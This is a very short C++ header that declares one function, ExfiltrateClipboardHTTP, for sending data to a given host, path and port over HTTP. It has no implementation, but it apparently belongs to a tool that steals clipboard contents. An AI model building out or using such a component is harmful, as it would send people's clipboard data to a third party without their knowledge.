#pragma once
#include <string>

bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string& path, int port = 80);